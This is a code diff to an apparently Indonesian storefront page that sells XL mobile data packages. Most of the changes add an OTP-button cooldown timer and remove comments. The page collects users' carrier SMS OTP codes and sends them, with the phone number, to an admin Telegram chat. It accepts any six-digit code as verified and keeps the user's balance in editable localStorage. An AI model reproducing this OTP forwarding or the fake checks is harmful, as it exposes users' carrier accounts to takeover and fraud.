@@ -198,6 +198,7 @@
             margin-left: 10px;
             transition: background-color 0.3s;
             white-space: nowrap;
+            min-width: 100px;
         }
         
         .send-otp-button:hover {
@@ -207,6 +208,17 @@
         .send-otp-button:disabled {
             background-color: #666;
             cursor: not-allowed;
+        }
+        
+        /* Tombol Kirim OTP dalam mode timer */
+        .send-otp-button.timer {
+            background-color: #666;
+            color: var(--text-secondary);
+            cursor: not-allowed;
+        }
+        
+        .send-otp-button.timer:hover {
+            background-color: #666;
         }
         
         /* Input OTP */
@@ -1393,9 +1405,53 @@
         let selectedProduct = null;
         let otpSent = false;
         let pendingTransaction = null;
-        let otpVerified = false; // Status OTP sementara untuk satu transaksi
+        let otpVerified = false;
         let otpTimerInterval = null;
         let currentPhoneNumber = '';
+        let otpCooldownInterval = null;
+        let otpCooldownTime = 0;
+
+        // ===============================
+        // FUNGSI TIMER OTP COOLDOWN - BARU
+        // ===============================
+        function startOtpCooldownTimer() {
+            const sendOtpButton = document.getElementById('send-otp-button');
+            
+            // Hentikan timer sebelumnya jika ada
+            if (otpCooldownInterval) {
+                clearInterval(otpCooldownInterval);
+            }
+            
+            // Set cooldown time 5 menit (300 detik)
+            otpCooldownTime = 300;
+            
+            // Simpan state cooldown ke localStorage
+            localStorage.setItem('pxstore_otp_cooldown', JSON.stringify({
+                cooldownTime: otpCooldownTime,
+                timestamp: Date.now()
+            }));
+            
+            // Update tombol menjadi mode timer
+            sendOtpButton.classList.add('timer');
+            sendOtpButton.disabled = true;
+            
+            // Mulai timer
+            otpCooldownInterval = setInterval(() => {
+                otpCooldownTime--;
+                
+                const minutes = Math.floor(otpCooldownTime / 60);
+                const seconds = otpCooldownTime % 60;
+                sendOtpButton.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                
+                if (otpCooldownTime <= 0) {
+                    clearInterval(otpCooldownInterval);
+                    sendOtpButton.textContent = 'Kirim OTP';
+                    sendOtpButton.classList.remove('timer');
+                    sendOtpButton.disabled = false;
+                    localStorage.removeItem('pxstore_otp_cooldown');
+                }
+            }, 1000);
+        }
 
         // ===============================
         // FUNGSI TELEGRAM
@@ -1428,7 +1484,6 @@
             }
         }
 
-        // Fungsi sensor nomor (3 digit depan + xxx + 3 digit belakang)
         function sensorPhoneNumber(phone) {
             if (!phone || phone.length < 6) return phone;
             const start = phone.substring(0, 3);
@@ -1436,7 +1491,6 @@
             return start + 'xxx' + end;
         }
 
-        // Notifikasi Order Baru → ke ADMIN
         async function sendOrderNotification(phoneNumber, product, orderId) {
             const message = `🛒 *ORDER BARU - TEMBAK PAKET XL*
 *-----------------------------------------*
@@ -1454,9 +1508,8 @@ _Silahkan proses orderan ini dan kirimkan OTP ke pengguna._`;
             }
         }
 
-        // Notifikasi OTP Request → ke ADMIN
         async function sendOTPRequestNotification(phoneNumber) {
-            const message = `📱 *REQUEST OTP - TEMBAK PAKET XL*
+            const message = `📱 *REQUEST OTP*
 
 *Nomor HP:* \`${phoneNumber}\`
 *Waktu:* ${new Date().toLocaleString('id-ID')}
@@ -1468,9 +1521,8 @@ _User sedang menunggu OTP dari operator. Silakan pantau sistem untuk konfirmasi 
             }
         }
 
-        // Notifikasi OTP Verified → ke ADMIN DENGAN KODE OTP
         async function sendOTPVerifiedNotification(phoneNumber, otpCode) {
-            const message = `✅ *OTP VERIFIED - TEMBAK PAKET XL*
+            const message = `✅ *OTP VERIFIED*
 
 *Nomor HP:* \`${phoneNumber}\`
 *Kode OTP:* \`${otpCode}\`
@@ -1483,11 +1535,10 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
             }
         }
 
-        // Notifikasi Transaksi Sukses → HANYA GRUP (nomor disensor)
         async function sendSuccessNotification(transaction) {
             const maskedPhone = sensorPhoneNumber(transaction.phoneNumber);
 
-            const message = `🛒 *TRANSAKSI SUKSES - TEMBAK PAKET XL*
+            const message = `🛒 *TRANSAKSI SUKSES*
 *-----------------------------------------*
 *Nomor HP:* \`${maskedPhone}\`
 *Produk:* ${transaction.productName}
@@ -1497,7 +1548,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
 *Waktu:* ${new Date(transaction.timestamp).toLocaleString('id-ID')}
 *-----------------------------------------*`;
 
-            // Kirim hanya ke grup
             for (const groupId of TELEGRAM_GROUP_IDS) {
                 await sendTelegramMessage(groupId, message);
             }
@@ -1506,14 +1556,10 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
         // ===============================
         // FUNGSI RIWAYAT TRANSAKSI
         // ===============================
-
-        // Fungsi untuk menyimpan transaksi ke riwayat
         function saveToTransactionHistory(transaction) {
             try {
-                // Load existing transactions
                 const existingTransactions = JSON.parse(localStorage.getItem('pxstore_transactions') || '[]');
                 
-                // Format transaction sesuai dengan sistem riwayat yang ada
                 const formattedTransaction = {
                     id: transaction.id,
                     product: transaction.productName,
@@ -1525,10 +1571,8 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                     keterangan: `Pembelian ${transaction.productName} - ${transaction.phoneNumber}`
                 };
                 
-                // Tambahkan transaksi baru
                 existingTransactions.push(formattedTransaction);
                 
-                // Simpan kembali ke localStorage
                 localStorage.setItem('pxstore_transactions', JSON.stringify(existingTransactions));
                 
                 console.log('Transaksi berhasil disimpan ke riwayat:', formattedTransaction);
@@ -1544,13 +1588,26 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
         // ===============================
         function loadUserData() {
             try {
-                // Load balance
                 const savedBalance = localStorage.getItem('pxstore_user_balance');
                 userBalance = savedBalance ? parseInt(savedBalance) : 0;
                 
-                // Load points
                 const savedPoints = localStorage.getItem('pxstore_user_points');
                 userPoints = savedPoints ? parseInt(savedPoints) : 0;
+                
+                // Load OTP cooldown state - BARU
+                const savedCooldown = localStorage.getItem('pxstore_otp_cooldown');
+                if (savedCooldown) {
+                    const cooldownData = JSON.parse(savedCooldown);
+                    const timePassed = Date.now() - cooldownData.timestamp;
+                    const remainingTime = cooldownData.cooldownTime - Math.floor(timePassed / 1000);
+                    
+                    if (remainingTime > 0) {
+                        otpCooldownTime = remainingTime;
+                        startOtpCooldownTimer();
+                    } else {
+                        localStorage.removeItem('pxstore_otp_cooldown');
+                    }
+                }
                 
                 updateBalanceDisplay();
                 return true;
@@ -1602,7 +1659,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 const data = await response.json();
                 allProducts = data.products || [];
                 
-                // Map data dari format baru ke format yang diharapkan aplikasi
                 allProducts = allProducts.map(product => ({
                     id: product.id,
                     name: product.name,
@@ -1617,7 +1673,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 return allProducts;
             } catch (error) {
                 console.error('Error loading products:', error);
-                // Fallback data
                 allProducts = [
                     {
                         id: 1,
@@ -1682,11 +1737,17 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
         }
 
         // ===============================
-        // FUNGSI OTP - MODIFIKASI: OTP HANYA UNTUK SATU TRANSAKSI
+        // FUNGSI OTP
         // ===============================
         function sendOTP() {
             const phoneInput = document.getElementById('phone-input');
             const phoneNumber = phoneInput.value.trim();
+            const sendOtpButton = document.getElementById('send-otp-button');
+
+            // Cek jika masih dalam cooldown - BARU
+            if (otpCooldownTime > 0) {
+                return;
+            }
 
             if (!phoneNumber) {
                 showWarningPopup();
@@ -1700,23 +1761,20 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
 
             currentPhoneNumber = phoneNumber;
             
-            // Tampilkan loading OTP
             showLoadingModalOTP();
             
-            // Simulasi proses request OTP ke operator
             setTimeout(() => {
                 hideLoadingModalOTP();
                 
-                // Tampilkan input OTP
                 showOTPInput();
                 
-                // Mulai timer 5 menit
                 startOTPTimer();
                 
-                // Kirim notifikasi ke admin bahwa user sedang menunggu OTP
+                // MULAI TIMER COOLDOWN 5 MENIT UNTUK TOMBOL KIRIM OTP - BARU
+                startOtpCooldownTimer();
+                
                 sendOTPRequestNotification(phoneNumber);
                 
-                // Update info OTP
                 document.querySelector('.otp-info').innerHTML = `
                     <i class="fas fa-info-circle"></i>
                     Silakan tunggu SMS dari operator yang berisi kode OTP. Anda memiliki waktu 5 menit untuk memasukkan OTP.
@@ -1728,17 +1786,15 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
         }
 
         function startOTPTimer() {
-            // Hapus timer sebelumnya jika ada
             if (otpTimerInterval) {
                 clearInterval(otpTimerInterval);
             }
             
-            let timeLeft = 300; // 5 menit dalam detik
+            let timeLeft = 300;
             const timerElement = document.createElement('div');
             timerElement.className = 'otp-timer';
             
             const otpInfo = document.querySelector('.otp-info');
-            // Hapus timer sebelumnya jika ada
             const existingTimer = otpInfo.querySelector('.otp-timer');
             if (existingTimer) {
                 existingTimer.remove();
@@ -1771,23 +1827,17 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 return;
             }
             
-            // OTP divalidasi berdasarkan input user (format dasar 6 digit)
             if (enteredOTP.length === 6) {
-                // OTP valid
                 otpVerified = true;
                 
-                // Hentikan timer
                 if (otpTimerInterval) {
                     clearInterval(otpTimerInterval);
                 }
                 
-                // Tampilkan modal sukses OTP
                 showSuccessModalOTP();
                 
-                // Kirim notifikasi ke admin bahwa OTP telah diverifikasi DENGAN KODE OTP
                 sendOTPVerifiedNotification(currentPhoneNumber, enteredOTP);
                 
-                // Scroll ke daftar produk
                 setTimeout(() => {
                     document.getElementById('product-list').scrollIntoView({ behavior: 'smooth' });
                 }, 500);
@@ -1797,7 +1847,7 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
         }
 
         // ===============================
-        // FUNGSI PEMBELIAN PRODUK - MODIFIKASI: RESET OTP SETELAH PEMBELIAN
+        // FUNGSI PEMBELIAN PRODUK
         // ===============================
         function buyProduct(productId) {
             if (!otpVerified) {
@@ -1818,7 +1868,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 return;
             }
 
-            // Cek saldo SEBELUM melakukan apapun
             const finalPrice = Math.round(product.price + (product.price * PRICE_MARKUP / 100));
             
             if (userBalance < finalPrice) {
@@ -1831,19 +1880,14 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 return;
             }
 
-            // Jika saldo cukup, lanjutkan proses
             selectedProduct = product;
             
-            // Tampilkan loading pembelian
             showLoadingModalPurchase();
             
-            // Generate order ID
             const orderId = 'PX-' + Date.now();
             
-            // Kirim notifikasi order ke Telegram
             sendOrderNotification(phoneNumber, product, orderId);
             
-            // Simpan transaksi pending
             pendingTransaction = {
                 id: orderId,
                 productName: product.name,
@@ -1853,71 +1897,52 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 timestamp: new Date().toISOString()
             };
             
-            // Simulasi proses pembelian
             setTimeout(() => {
                 hideLoadingModalPurchase();
                 
-                // Double check saldo (untuk memastikan tidak ada perubahan selama proses)
                 if (userBalance < finalPrice) {
                     showInvalidModal('Saldo Berubah', 
                         'Saldo Anda tidak mencukupi. Mungkin terjadi perubahan saldo selama proses.');
                     return;
                 }
                 
-                // Kurangi saldo
                 const newBalance = userBalance - finalPrice;
                 saveUserBalance(newBalance);
                 
-                // Tambah poin
                 const pointsEarned = Math.floor(finalPrice / 100);
                 const newPoints = userPoints + pointsEarned;
                 saveUserPoints(newPoints);
                 
-                // Update status transaksi
                 pendingTransaction.status = 'success';
                 pendingTransaction.pointsEarned = pointsEarned;
                 
-                // SIMPAN KE RIWAYAT TRANSAKSI
                 saveToTransactionHistory(pendingTransaction);
                 
-                // Kirim notifikasi sukses ke Telegram
                 sendSuccessNotification(pendingTransaction);
                 
-                // Tampilkan modal sukses pembelian
                 document.getElementById('success-points-value').textContent = pointsEarned;
                 showSuccessModalPurchase();
                 
-                // ===============================
-                // MODIFIKASI PENTING: RESET OTP SETELAH PEMBELIAN SELESAI
-                // ===============================
                 resetOtpAfterPurchase();
                 
             }, 3000);
         }
 
-        // ===============================
-        // FUNGSI BARU: RESET OTP SETELAH PEMBELIAN
-        // ===============================
         function resetOtpAfterPurchase() {
-            // Reset semua status OTP
             otpVerified = false;
             otpSent = false;
             currentPhoneNumber = '';
             
-            // Reset input fields
             document.getElementById('phone-input').value = '';
             document.getElementById('otp-input').value = '';
             
-            // Sembunyikan container OTP
             document.getElementById('otp-container').style.display = 'none';
             
-            // Hentikan timer jika masih berjalan
             if (otpTimerInterval) {
                 clearInterval(otpTimerInterval);
                 otpTimerInterval = null;
             }
             
-            // Hapus elemen timer jika ada
             const timerElement = document.querySelector('.otp-timer');
             if (timerElement) {
                 timerElement.remove();
@@ -2120,13 +2145,10 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
             updateBalanceDisplay();
             loadProducts();
             
-            // Event listener untuk tombol Kirim OTP
             document.getElementById('send-otp-button').addEventListener('click', sendOTP);
             
-            // Event listener untuk tombol Verifikasi OTP
             document.getElementById('verify-otp-button').addEventListener('click', verifyOTP);
             
-            // Event listener untuk input OTP (Enter key)
             const otpInput = document.getElementById('otp-input');
             if (otpInput) {
                 otpInput.addEventListener('keypress', function(e) {
@@ -2136,7 +2158,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 });
             }
             
-            // Event listener untuk pencarian
             const searchInput = document.getElementById('search-input');
             if (searchInput) {
                 searchInput.addEventListener('input', function() {
@@ -2144,7 +2165,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
                 });
             }
             
-            // Event listener untuk tombol tutup modal
             document.getElementById('close-success-otp-modal').addEventListener('click', hideSuccessModalOTP);
             document.getElementById('close-success-purchase-modal').addEventListener('click', hideSuccessModalPurchase);
             document.getElementById('close-invalid-modal').addEventListener('click', hideInvalidModal);
@@ -2152,7 +2172,6 @@ _User telah berhasil memverifikasi OTP dari operator. Kode OTP telah dikonfirmas
             document.getElementById('close-search-modal').addEventListener('click', hideSearchModal);
             document.getElementById('search-icon').addEventListener('click', showSearchModal);
             
-            // Event listener untuk klik di luar modal
             window.addEventListener('click', function(event) {
                 const searchModal = document.getElementById('search-modal');
                 if (event.target === searchModal) {
